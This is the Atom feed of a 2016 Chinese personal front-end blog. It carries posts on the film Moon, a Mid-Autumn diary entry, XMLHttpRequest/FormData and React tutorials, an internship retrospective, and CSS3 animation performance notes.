<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hubyo&#39;blog</title>
  <subtitle>FE | CQ@China</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.zchub.cn/"/>
  <updated>2016-09-25T03:11:05.036Z</updated>
  <id>http://blog.zchub.cn/</id>
  
  <author>
    <name>Rivers</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>月球</title>
    <link href="http://blog.zchub.cn/2016/09/25/movie_moon/"/>
    <id>http://blog.zchub.cn/2016/09/25/movie_moon/</id>
    <published>2016-09-25T10:52:49.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h4 id="月球观后"><a href="#月球观后" class="headerlink" title="月球观后"></a>月球观后</h4><a id="more"></a>
<p>角色&lt;10的一部电影（主演：男主+一个机器人柯理。）<br>最让人感动的一是机器人为了帮助同伴，给克隆体很多关键提示，最后并提议删除他的记忆。另一个是克隆体五代虽然工作完三年把回家的机会让给给六代，因为他知道‘另一个自己’至少有三年的时间与家人呆在一起，来帮忙完成之前的心愿。</p>
<p>企业为了利益克隆类似个体，他们在循环的三年之间做着相同的事情，被植入相同的记忆。来驱动他们工作，有可能第一代主体，是由于上次的故障，可能已经牺牲。而他又被该组织进行克隆，克隆体一直留在月球上进行工作，为企业谋得利益。</p>
<p>每一个个体都有自己的思想，而克隆体也是一个独有的个体。在伦理上来说，克隆体应该不算是人，而不过承认他们是人，那真正的人类又称为什么。对于这个个体，他们只能存在3年，如此不停的循环中。而这作为转机，克隆体能回到家，完成之前男主的愿望。</p>
<p>企业在某些利益面前，会无视个人的想法，他们使用各种手段来洗脑，限制你的获取信息，这与传销应该类似。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;月球观后&quot;&gt;&lt;a href=&quot;#月球观后&quot; class=&quot;headerlink&quot; title=&quot;月球观后&quot;&gt;&lt;/a&gt;月球观后&lt;/h4&gt;
    
    </summary>
    
      <category term="生活日记" scheme="http://blog.zchub.cn/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://blog.zchub.cn/tags/dairy/"/>
    
      <category term="movie" scheme="http://blog.zchub.cn/tags/movie/"/>
    
      <category term="impressions" scheme="http://blog.zchub.cn/tags/impressions/"/>
    
  </entry>
  
  <entry>
    <title>无聊中秋节</title>
    <link href="http://blog.zchub.cn/2016/09/15/%E6%97%A0%E8%81%8A%E7%9A%84%E4%B8%AD%E7%A7%8B%E8%8A%82/"/>
    <id>http://blog.zchub.cn/2016/09/15/无聊的中秋节/</id>
    <published>2016-09-15T10:00:01.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2016中秋节"><a href="#2016中秋节" class="headerlink" title="2016中秋节"></a>2016中秋节</h2><a id="more"></a>
<p>今天9月15日，农历8月15，正是传统的中秋节。地点：杭州。天气，雨（可能有暴雨）。<br>本来是传统赏月的日子，这种天气真的好吗？不过也没关系，从小时候开始印象中中秋节好像都不能赏月!<br>真是个悲伤的故事。晚上月亮给我躲猫猫就算了，白天让我可以出去浪嘛，这样子只能呆在家里，会闷出病的。</p>
<p>依稀记得去年的这个时候，我们一群人刚到成都找工作，那段时间真是痛并快乐的日子。一起经历痛苦，失望，高兴。以为找了工作之后，我们会变得轻松，自由…，经历后发现只是自己的意愿。还是被欲望，工作所牵绊。</p>
<p>最后希望目前正在准备校招的学弟学妹们都能找到自己满意的工作，大家中秋节快乐呀！在家也可以嗨，哈哈！<br>晚上搞点公司的葡萄酒。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;2016中秋节&quot;&gt;&lt;a href=&quot;#2016中秋节&quot; class=&quot;headerlink&quot; title=&quot;2016中秋节&quot;&gt;&lt;/a&gt;2016中秋节&lt;/h2&gt;
    
    </summary>
    
      <category term="生活日记" scheme="http://blog.zchub.cn/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://blog.zchub.cn/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>获取数据方式</title>
    <link href="http://blog.zchub.cn/2016/07/27/fe-upload-method/"/>
    <id>http://blog.zchub.cn/2016/07/27/fe-upload-method/</id>
    <published>2016-07-27T17:18:36.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><p>  前后端数据交互的方式通常有。</p>
<ul>
<li>xmlHttpRequest</li>
<li>formData</li>
<li>webSocket</li>
<li>promise</li>
<li>fetch</li>
</ul>
<h3 id="slider"><a href="#slider" class="headerlink" title="slider"></a>slider</h3><p>  如果框架中需要用原生javascript来写的话，会涉及到 xmlHttpRequest 这个对象。<br>通过这个对象我们能与后台进行交互，获取数据。</p>
<pre><code>```javascript
function ajax(options) {
      options = options || {};
      options.type = (options.type || &quot;GET&quot;).toUpperCase();
      options.dataType = options.dataType || &quot;json&quot;;
      let params = this.formatParams(options.data);
  let xhr;

      if (window.XMLHttpRequest) {
          xhr = new XMLHttpRequest();
      } else { //IE6及其以下版本浏览器
          xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);
      }

      xhr.withCredentials = true;
      //接收 - 第三步
      xhr.onreadystatechange = function () {
          if (xhr.readyState == 4) {
              let status = xhr.status;
              if (status &gt;= 200 &amp;&amp; status &lt; 300 || xhr.status == 304) {
                  options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);
              } else {
                  options.fail &amp;&amp; options.fail(status);
              }
          }
      };
      //连接 和 发送 - 第二步
      if(options.type == &quot;GET&quot;) {
          xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);   
          xhr.send(null);
      }else if ((&quot;POST&quot;) == options.type ) {
          xhr.open(&quot;POST&quot;, options.url, true);
          xhr.setRequestHeader(&quot;Content-Type&quot;, options.contentType || &quot;application/x-www-form-urlencoded&quot;);
          if(options.header){
              options.header.map(function(hd){
                  xhr.setRequestHeader(hd.title, hd.value);
              });
          }
          xhr.send(params);
      }
  }

function formatParams(data){
  var arr = [];
  for (var name in data) {
      //参数通过编码，来避免 GET 请求时发生错误
      arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));
  }
  return arr.join(&quot;&amp;&quot;);
}
</code></pre><p>  以上代码，是我们熟悉的xmlHttpRequest封装的请求后台方法。包括了解析参数、新建连接、发送数据、接受部分数据、接受数据等步骤。</p>
<blockquote>
<p> GET 方式发送数据<br>  xhr.open(‘GET’, url , true) 如果没有用绝对路径，打开的方式是相对地址。所以如果配置的链接中没有包含 http 头可能会引起错误。</p>
</blockquote>
<p>  其中 <i> xhr.withCredentials = true; </i>是为了发送认证数据，如 cookie 为了防止跨域时候请求失败。</p>
<p>  在发送数据 xhr.send()之前需要完成对 xhr 的一系列操作。</p>
<p>优点 ： 局部刷新,不影响用户的体验<br>缺点 ： 跨域问题，只能访问同域下的资源</p>
<h4 id="formData"><a href="#formData" class="headerlink" title="formData"></a>formData</h4><p>XHR2规范中的内容，最近做了个图片上传就用到 formData。</p>
<blockquote>
<p>目的是用于表单数据序列化</p>
</blockquote>
<p><img src="http://7xklhg.com1.z0.glb.clouddn.com/formdata-api.png" alt=""></p>
<p>在 chrome的控制台下可以看到formData详细的 API，提供了新增、删除和遍历的方法。</p>
<p>当然在添加值之前需要初始化 formData.</p>
<pre><code>//我们可以直接通过构造方法添加 formData
var data1 = new FormData(document.forms[0]);

//方法二,通过 append 方法
var data2 = new FormData();
data2.append(key,value) 需要两个参数，键和值。

//使用 FormData上传
var xhr = new XMLHttpRequest();
xhr.open(&apos;POST&apos;,url,true);
xhr.send(data); //写入数据
</code></pre><ul>
<li><p>progress()<br>通过该方法我们可以监听该上传数据的进程，可以通过返回的参数能用进度条更好地进行交互。</p>
<p>  xhr.progress = function(pe){</p>
<pre><code>if(pe.lengthComputable){

}
</code></pre><p>  }</p>
<p>  当 我们通过头部信息 content-length 知道 后，lengthComputable会被<br>优点： 我们不需要去设置请求头部，XHR 对象能够识别数据类型是否是 formData 的实例。<br>缺点： 目前IE 浏览器需要 10+ 支持（真是坑）</p>
</li>
</ul>
<h3 id="webSocket"><a href="#webSocket" class="headerlink" title="webSocket"></a>webSocket</h3><p>在 web 端建立 socket来进行通信，刚开始学习java 时通过进行 client 和 server 类，通过 socket来进行通信。</p>
<ul>
<li><p>使用入门</p>
<p>  var connection = new WebSocket(‘ws://html5rocks.websocket.org/echo’, [‘soap’, ‘xmpp’]);</p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;header&quot;&gt;&lt;a href=&quot;#header&quot; class=&quot;headerlink&quot; title=&quot;header&quot;&gt;&lt;/a&gt;header&lt;/h3&gt;&lt;p&gt;  前后端数据交互的方式通常有。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;xmlHttpRequest&lt;/li&gt;
&lt;li&gt;
    
    </summary>
    
    
      <category term="file-upload" scheme="http://blog.zchub.cn/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>react-freshman</title>
    <link href="http://blog.zchub.cn/2016/07/24/react-freshman/"/>
    <id>http://blog.zchub.cn/2016/07/24/react-freshman/</id>
    <published>2016-07-24T21:41:08.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>  随着react的快速发展，越来越多的公司在项目中的前端技术上都会考虑react,并且有越来越多成熟的应<br>用和项目证明了 react的优势所在，而目前蚂蚁金服开发的 ant-design 也被开发者使用，目前在 github<br>的排名还是挺高的。目前我们公司就是使用的技术栈是  react + antd + es6！</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>  作为新手，首先还是需要了解几个概念的。</p>
<ul>
<li>state<br>每个组件有自己对应的状态，里面通常保存一些需要进行动态交互的变量。如表单中控制输入框的字数</li>
</ul>
<pre><code>var input = React.createClass({
  getInitailState : function(){
    return {
      inputValue: &apos;&apos;
    }
  },
  onChange : function(e){
    this.setState({
       inputValue = e.target.value
    })
  },
  render: function(){
    return (
        &lt;div className=&apos;h&apos;&gt;
          &lt;input type=&apos;textarea&apos; value={this.state.inputValue} onChange={this.onChange}&gt;
        &lt;/div&gt;
    )
  }
})
</code></pre><a id="more"></a>
<ul>
<li>props<br>用于父子组件之间传递数据的桥梁，子组件中可以通过 this.props.name 的方式来访问父组件传递的对象、方法。<br>最容易理解的就是子组件可以数据流的方式访问到变量，那在子组件中修改的数据如何保存到父组件呢？也是靠<br>this.props,但这时候就要在子组件的方法中调用该方法了</li>
</ul>
<pre><code>var Parent = React.createClass({
  getDefaultProps : function(){
    return {
      name: &apos;zc&apos;
    }
  },
  getInitailState : function(){
    return {
      name: this.props.name
    }
  },
  changeName : function(name){
    this.setState({
       name : name
    })
  },
  handleSubmit : function(){
    var name = this.state.name
    // ...upload
  },
  render: function(){
    return (
      &lt;form onSubmit={this.handleSubmit}&gt;
        &lt;Child initData={this.state.name} changeName = {this.changeName}/&gt;
      &lt;/form&gt;
    )
  }
})


var Child = React.createClass({
  handleChange: function(e){
    this.props.handleChange(e.target.value)
  },
  render: function(){
    return(
      &lt;input type=&apos;text&apos;  value={this.props.initData} onChange={this.handleChange}/&gt;
    )
  }
})
</code></pre><p>  parent、child 组件中的数据通过 this.props.name 来进行传递,子类中通过 this.props.handleChange<br>来让父类控制父类state中 name 的更新。父类的state的 name 是数据来源，每次它的更新都会让子类重新渲染。</p>
<p>  而其中react 提供的几个生命周期方法，对我们大有帮助，由于生命周期，从开始到结束我们都能够调用<br>它提供的方法接口来编写我们的代码</p>
<ul>
<li><p>实例化</p>
<ul>
<li><p>getDefaultProps<br>设置默认的props值，只被调用一次（总共，无论是否在其他组件中使用）。在父类组件没有指定 props 属性</p>
</li>
<li><p>getInitailState<br>初始化当前组件的 state, 组件实例只调用一次</p>
</li>
<li><p>componentWillMount<br>react 渲染的过程同步，componentWillMount中的运行代码会阻塞组件的 render 过程。所以避免耗死的操作</p>
</li>
<li><p>render<br>创建一个虚拟 DOM，用来展示组件<br>1.只有一个顶级组件，通常用<div>标签包装<br>2.千万不能调用 the.setState(),会引起重新render，然后就是死循环，然后… ，不要问我为什么…,你懂得!<br>3.若使用 jsx(javascript xml)，标签都是闭合的</div></p>
</li>
<li><p>componentDidMount<br>当 DOM 渲染完毕可以通过 getDOMNode()的方式来获取节点，然后我们就可以对 DOM 进行一系列操作。<br>通常我们调用后台数据的方法可以写在这里。再使用 this.setState()对组件 render。若作为父组件中需要传入数据到<br>子组件中，而子组件需要访问其他数据，这里涉及到两次的刷新，如果在这时候在子组件中通过 componentDidMount 来请求数据，就不能满足。因为 componentDidMount 只在 组件加载的时候渲染一次。这时候 componentWillReceiveProps 出场了！</p>
</li>
<li><p>componentWillReceiveProps<br>通过参数从父组件中获取值。</p>
</li>
</ul>
</li>
</ul>
<pre><code>componentWillReceiveProps(nextProps){
    nextProps.getProps()
    // do something
    // update the current state in the sub-component
    // then the component will render
}
</code></pre><h3 id="表单的约束与非约束"><a href="#表单的约束与非约束" class="headerlink" title="表单的约束与非约束"></a>表单的约束与非约束</h3><p>表单用来与用户进行交互，自然重要。<br>这里就涉及到表单组件的约束与非约束问题。顾名思义，约束肯定是需要一定的行为来控制它的表现（背后数据的改变）。 由于 react 实现了 DOM 大部分的方法（很多是直接拦截）。如 input、select 中的onChange事件。</p>
<pre><code>export default class Input extends React.component{
  component(props){
      super(props);
      this.state = {
        value: this.props.initValue
      };
      this.onChange = this.onChange.bind(this);
  }
  onChange(value){
      this.setState({
        value : value
      });
  }
  render(){
    return(
      &lt;div&gt;
        &lt;input type=&apos;text&apos; value={this.state.value}/&gt;
      &lt;/div&gt;
    )
  }
}
</code></pre><p>  这里的 Input 组件可以通过修改它的值的大小，所以必须设置它的 value 属性才能进行更新。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h3&gt;&lt;p&gt;  随着react的快速发展，越来越多的公司在项目中的前端技术上都会考虑react,并且有越来越多成熟的应&lt;br&gt;用和项目证明了 react的优势所在，而目前蚂蚁金服开发的 ant-design 也被开发者使用，目前在 github&lt;br&gt;的排名还是挺高的。目前我们公司就是使用的技术栈是  react + antd + es6！&lt;/p&gt;
&lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;  作为新手，首先还是需要了解几个概念的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;state&lt;br&gt;每个组件有自己对应的状态，里面通常保存一些需要进行动态交互的变量。如表单中控制输入框的字数&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;var input = React.createClass({
  getInitailState : function(){
    return {
      inputValue: &amp;apos;&amp;apos;
    }
  },
  onChange : function(e){
    this.setState({
       inputValue = e.target.value
    })
  },
  render: function(){
    return (
        &amp;lt;div className=&amp;apos;h&amp;apos;&amp;gt;
          &amp;lt;input type=&amp;apos;textarea&amp;apos; value={this.state.inputValue} onChange={this.onChange}&amp;gt;
        &amp;lt;/div&amp;gt;
    )
  }
})
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="javascript" scheme="http://blog.zchub.cn/categories/javascript/"/>
    
    
      <category term="react" scheme="http://blog.zchub.cn/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>internship-summary</title>
    <link href="http://blog.zchub.cn/2016/04/11/internship-summary-in-vdian/"/>
    <id>http://blog.zchub.cn/2016/04/11/internship-summary-in-vdian/</id>
    <published>2016-04-11T16:40:29.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实习总结"><a href="#实习总结" class="headerlink" title="实习总结"></a>实习总结</h2><p> 4个月的实习时间就这么完了，期间有过快乐，难过，彷徨，不过我对自己的实习比较满意，不过还是留下了自己的遗憾!</p>
<h4 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h4><p>  作为一个在学校实验室做过项目的童鞋本以为可以轻松上手，但是远远超出了我的想象。从严格意义上来说，我进入微店才知道什么是一个前端开发者。其中华哥对我的帮助特别大，一手带我进入项目，并在平时的开发中给了我很多好的建议和意见，在这里我非常地感谢他。</p>
<p>  微店大多数是移动端下的，而我又处在分销项目组下，分销顾名思义就是你作为一个中间角色把商品卖出去。说来也巧，我爸作为一个私体经营户正好承担的这个角色，所以我在理解业务这块还是比较快。</p>
<p>  微店和其他很多公司一样作为一个三方平台，在这之前我一直在想这些电子商务互联网公司是怎么来获取利润的？在华哥给我讲解后，以及我在开发过程中一点点明白，而我做的内容就是其中盈利的一部分吧！我主要做的是活动页面的开发，其中有两个地方在开始的时候有些阻碍，也让我犯了很多错！<br>    1、分销逻辑<br>    分销并不是单纯的买与卖的关系，它服务于供应商与分销商，而分销商代理后，用户可以进入店铺购买。（PS：华哥很耐心地给我讲了至少3次）！有一次犯了很低级的错误。</p>
<blockquote>
<p>在分销商在自己的朋友圈分销商品出去后，发出的链接却是供应商</p>
</blockquote>
<p> 我在想如果分销商知道后，还不把我骂死，分销这么多次结果却没有一元佣金。像这种错误就是没有在实际开发中联系业务逻辑造成的。</p>
<p>   2、开发流程重要性<br>   这个是个非常严重的错误，害的那几天都不怎么敢说话，睡觉也没睡好。虽然不是我直接造成，当我也有很大的责任。没有把开发者的职责尽到，没有严格按照开发流程来作业，导致了日常、线上环境链接混发。在开发工程需要细心，细心，再细心。</p>
<p>  现在活动被vms代替了，我很喜欢这样高效直接的方式，让我们有更多的时间去做有意义的事。另外，分销前端的项目需要重构，而在这个节骨眼上，我们又回学校了，估计又要延迟一段时间。（PS：感觉自己有点坑，哈哈）</p>
<a id="more"></a>
<h4 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h4><p>在沟通方面，没事就问华哥，不会就问华哥（PS：不过自己还是要思考很久之后，有的确实是没见过，没眉目）！每次都耐心解决，虽然有的问题比较低级。</p>
<p>在前端，我们有微信群和企业群，平时大家都在里面热烈地讨论，如果有问题很快有人回答。不过我有时候没有好意思在群里问，有的是在我QQ加入的前端群里问的，有的是在segmentfault里问的。其实不管怎么样，最终问题解决就好了。</p>
<p>而分销项目组，没周都有周会。我们分销团队人才济济，每次都好多人，很多时候都站在门口。而其中有的项目没有参与，感觉参与感不是很强，有时候很希望自己能在里面说说话。。。哈哈</p>
<h4 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h4><p>前端的内容多而广，一个好的前端开发者！每天的学习肯定是不断的，就那我来说。如果3天不写js，后面面对的话肯定是比较生疏的。而自从我进入公司就一直保持学习的状态！学习mac操作，公司的开发环境，开发规范，组件库，除了它的使用方法还有逻辑。每次我都很愿意去了解一个新的知识，但是我又有些担心之前的没有掌握好，又开始学下一个，这样做是不是有一点浅尝辄止的感觉！所以每一个我都把自己学到的知识点，学习的过程总结到自己的博客中。虽然很多是他人之前写过的内容，但是我觉得自己亲自写一遍肯定要好学多。</p>
<p>  在移动端方面，面临最多的就是适配的问题，我们公司使用的是rem方案，应该类似淘宝手淘的解决方案。<br>  而之前我在空余时间也写了<a href="http://blog.zchub.cn/2016/01/19/%E7%A7%BB%E5%8A%A8%E7%AB%AFweb%E6%80%9D%E8%80%83/">关于移动端的思考</a>  都是我在开发的过程中面临的问题已经自己的思路。</p>
<p> 而其他的内容，很多是开发中面临的问题，然后如何去解决。</p>
<p> 有的学习是受了实习小伙伴的影响，从他们身上我也学到了很多。</p>
<p> 就我而言，很多时候我不愿意去问人，更多的是在我折腾得实在不行了，在去找人解决。我在这个过程能比问人学到更多的知识，也是对被问人的礼貌，证明我是真正思考过的。</p>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>超级nice，市场最新设备！</p>
<ul>
<li>mac pro</li>
<li>人体弓形椅 </li>
<li>Dell高清大屏显示器</li>
<li>超大办公桌</li>
<li>小米空气净化器。<br>作为一个用了几年windows的还是有点不习惯！哈哈，真的是觉得超好，不好好利用这样的资源简直就是浪费。有几天我迷恋上了下班一个人在椅子上敲着代码，效率很高！</li>
</ul>
<p>不过我坐在讨论室旁边还是有点苦逼。平时尽量带上耳机，排除干扰。</p>
<h4 id="公司生活"><a href="#公司生活" class="headerlink" title="公司生活"></a>公司生活</h4><p>一个字，壕！福利好，每天零食，牛奶不断！朋友过生日，水果招待。（PS：都是被前端的小伙伴吃了，我们的地势独得天后）</p>
<p>团建，爽爽爽！<br>平时小伙伴加入，吃饭！<br>春天到了，春游！<br>不开心了，出去玩！<br>累了，出去玩！</p>
<p>最值得一提的就是公司年会，直接实现了我看海的计划，海南之旅。</p>
<p>当然，我们还是很好学的！定期的分享会，并提供同事到外学习的机会。然后就给我们分享，我觉得这是一种很好的学习方式。</p>
<p>另外，我觉得很好的是公司会组织运动，唱歌。我最喜欢的还是篮球，每次与小伙伴们一起战斗都特别开心。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总之，谢谢大家对我的帮助。特别是华哥，对我的生活还是工作上很关注！以上废话比较多，包涵。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;实习总结&quot;&gt;&lt;a href=&quot;#实习总结&quot; class=&quot;headerlink&quot; title=&quot;实习总结&quot;&gt;&lt;/a&gt;实习总结&lt;/h2&gt;&lt;p&gt; 4个月的实习时间就这么完了，期间有过快乐，难过，彷徨，不过我对自己的实习比较满意，不过还是留下了自己的遗憾!&lt;/p&gt;
&lt;h4 id=&quot;项目&quot;&gt;&lt;a href=&quot;#项目&quot; class=&quot;headerlink&quot; title=&quot;项目&quot;&gt;&lt;/a&gt;项目&lt;/h4&gt;&lt;p&gt;  作为一个在学校实验室做过项目的童鞋本以为可以轻松上手，但是远远超出了我的想象。从严格意义上来说，我进入微店才知道什么是一个前端开发者。其中华哥对我的帮助特别大，一手带我进入项目，并在平时的开发中给了我很多好的建议和意见，在这里我非常地感谢他。&lt;/p&gt;
&lt;p&gt;  微店大多数是移动端下的，而我又处在分销项目组下，分销顾名思义就是你作为一个中间角色把商品卖出去。说来也巧，我爸作为一个私体经营户正好承担的这个角色，所以我在理解业务这块还是比较快。&lt;/p&gt;
&lt;p&gt;  微店和其他很多公司一样作为一个三方平台，在这之前我一直在想这些电子商务互联网公司是怎么来获取利润的？在华哥给我讲解后，以及我在开发过程中一点点明白，而我做的内容就是其中盈利的一部分吧！我主要做的是活动页面的开发，其中有两个地方在开始的时候有些阻碍，也让我犯了很多错！&lt;br&gt;    1、分销逻辑&lt;br&gt;    分销并不是单纯的买与卖的关系，它服务于供应商与分销商，而分销商代理后，用户可以进入店铺购买。（PS：华哥很耐心地给我讲了至少3次）！有一次犯了很低级的错误。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在分销商在自己的朋友圈分销商品出去后，发出的链接却是供应商&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 我在想如果分销商知道后，还不把我骂死，分销这么多次结果却没有一元佣金。像这种错误就是没有在实际开发中联系业务逻辑造成的。&lt;/p&gt;
&lt;p&gt;   2、开发流程重要性&lt;br&gt;   这个是个非常严重的错误，害的那几天都不怎么敢说话，睡觉也没睡好。虽然不是我直接造成，当我也有很大的责任。没有把开发者的职责尽到，没有严格按照开发流程来作业，导致了日常、线上环境链接混发。在开发工程需要细心，细心，再细心。&lt;/p&gt;
&lt;p&gt;  现在活动被vms代替了，我很喜欢这样高效直接的方式，让我们有更多的时间去做有意义的事。另外，分销前端的项目需要重构，而在这个节骨眼上，我们又回学校了，估计又要延迟一段时间。（PS：感觉自己有点坑，哈哈）&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="internship" scheme="http://blog.zchub.cn/tags/internship/"/>
    
  </entry>
  
  <entry>
    <title>css3-animation-performance</title>
    <link href="http://blog.zchub.cn/2016/03/29/css3-animation-perfomance/"/>
    <id>http://blog.zchub.cn/2016/03/29/css3-animation-perfomance/</id>
    <published>2016-03-29T17:04:56.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h3 id="动画与性能"><a href="#动画与性能" class="headerlink" title="动画与性能"></a>动画与性能</h3><p>  在前端的活动开发中经常会遇到动画。在pc端往往看到的“正常”的动画在移动端却不正常。有的会出现“卡顿”和闪烁的现象。<br>  在了解动画之前，首先了解一些概念</p>
<h4 id="动画名词概念"><a href="#动画名词概念" class="headerlink" title="动画名词概念"></a>动画名词概念</h4><ul>
<li>帧： 在动画过程中，每一幅静止画面即为一“帧”</li>
<li>帧率：即每秒钟播放的静止画面的数量，单位是fps(Frame per second)</li>
<li>帧时长：即每一幅静止画面的停留时间，单位一般是ms(毫秒)</li>
<li>跳帧(掉帧/丢帧)：在帧率固定的动画中，某一帧的时长远高于平均帧时长，导致其后续数帧被挤压而丢失的现象</li>
<li>图层：用html片段放置在常规页面的页面。<a href="http://www.echoecho.com/csslayers.htm" target="_blank" rel="external">css layers</a> 通过z-index属性来控制重叠的顺序。 常见的层模型有 relative 和 absolute(fixed)等几种。</li>
</ul>
<h5 id="合成层-图层"><a href="#合成层-图层" class="headerlink" title="合成层(图层)"></a>合成层(图层)</h5><p> 那么动画是如何播放的，我们就涉及到了合成层。每个合成层对应了一个GPU纹理，所以它和内存息息相关。在超过一定范围，可能引起浏览器崩溃，观察数量是我们了解的最直接的方法。</p>
<ul>
<li>chrome？<br>其中chrome有很多层，包括了RenderLayer(负责 DOM 子树)，GraphicsLayer(负责 RenderLayer 的子树)。<br>chrome中如何显示层，打开chrome://flags/#composited-layer-borders启用，然后打开开发工具勾选Show composited layer borders。</li>
</ul>
<a id="more"></a>
<p><img src="http://7xklhg.com1.z0.glb.clouddn.com/chrome-open-layer-border.png" alt=""></p>
<p>  结果如下</p>
<p>  <img src="http://7xklhg.com1.z0.glb.clouddn.com/chrome-show-borders.png" alt=""></p>
<p>  这个页面只有一个层，其中蓝色的网格表示瓦片(tile)，他们作为层的单元。</p>
<p>创建层的标准,具体一下几种情况</p>
<ul>
<li>3D 或透视变换(perspective transform) CSS 属性</li>
<li>使用加速视频解码的 元素</li>
<li>拥有 3D (WebGL) 上下文或加速的 2D 上下文的 元素</li>
<li>混合插件(如 Flash)</li>
<li>对自己的 opacity 做 CSS 动画或使用一个动画 webkit 变换的元素</li>
<li>拥有加速 CSS 过滤器的元素</li>
<li>元素有一个包含复合层的后代节点(换句话说，就是一个元素拥有一个子元素，该子元素在自己的层里)</li>
<li><p>它的兄弟元素在复合层中渲染，而这个兄弟元素的z-index比较小（也会放到复合层）</p>
<ul>
<li>对于Firefox，打开about:config然后设置layers.draw-borders为true</li>
</ul>
</li>
</ul>
<h5 id="浏览器中DOM到屏幕"><a href="#浏览器中DOM到屏幕" class="headerlink" title="浏览器中DOM到屏幕"></a>浏览器中DOM到屏幕</h5><p> 经常面试会问到这个相关的问题。“浏览器访问过程发生的事情？”。讲到渲染的时候，都是html dom tree + css stylesheet = render tree。那么更具体一点的呢？</p>
<p>   1.获取 DOM 并将其分割为多个层<br>   2.将每个层独立的绘制进位图中<br>   3.将层作为纹理上传至 GPU<br>   4.复合多个层来生成最终的屏幕图像。</p>
<p>   层是不是越多越好呢？并不是，层会占用系统 RAM 与 GPU(在移动设备上尤其有限)的内存，并且拥有大量的层会因为记录哪些是可见的而引入额外的开销。所以我们应该控制</p>
<h4 id="动画的种类"><a href="#动画的种类" class="headerlink" title="动画的种类"></a>动画的种类</h4><ul>
<li>css<ul>
<li>css dom animation</li>
<li>svg animation</li>
</ul>
</li>
<li>javascript<ul>
<li>javascript dom animation</li>
<li>canvas animation</li>
<li>webGL</li>
</ul>
</li>
<li>jquery</li>
</ul>
<h5 id="动画如何选择"><a href="#动画如何选择" class="headerlink" title="动画如何选择"></a>动画如何选择</h5><p>  动画方案以上几种，我们如何选择合适的，高性能的动画呢？</p>
<p>  js动画通过操作DOM元素修改样式来是实现动画，在PC端兼容低端浏览器更占优势。</p>
<p><em>优点：更好的控制。如动画的开始，结束以及监听动画</em><br><em>缺点：js本身是单线程，其他的js可能对其干扰，造成线程阻塞，引起“丢帧”现象</em></p>
<p>  在移动端，我们选择性能更优的css3动画！它由浏览器来执行。但是移动端本身的特殊性，性能成为一大痛点。<br><em>优点：浏览器能对动画进行优化。使用图层，这样在主线程外运行</em><br><em>缺点：控制力弱，难以实现动画的有序显示</em></p>
<p>  jquery在选择引擎效率确实很快，但是在动画方面不占优势。原因是经常触发垃圾回收（导致动画运行过程中的卡顿）。以及不能避免的<a href="http://wilsonpage.co.uk/preventing-layout-thrashing/" target="_blank" rel="external">layout thrashing</a>（导致在动画开始卡顿），多余的relayout/reflow。</p>
<h5 id="什么是硬件加速"><a href="#什么是硬件加速" class="headerlink" title="什么是硬件加速"></a>什么是硬件加速</h5><p>  浏览器不会在动画的每一帧都绘制一次，而是生成DOM元素的快照，并作为GPU纹理（也被叫做层）存储起来。之后浏览器只需要告诉GPU[擅长图形计算]去转换指定的纹理来实现DOM元素的动画效果。这就叫做GPU合成，也经常被称作『硬件加速』。</p>
<p><em>缺点：消耗用户设备电量，消耗电池寿命</em></p>
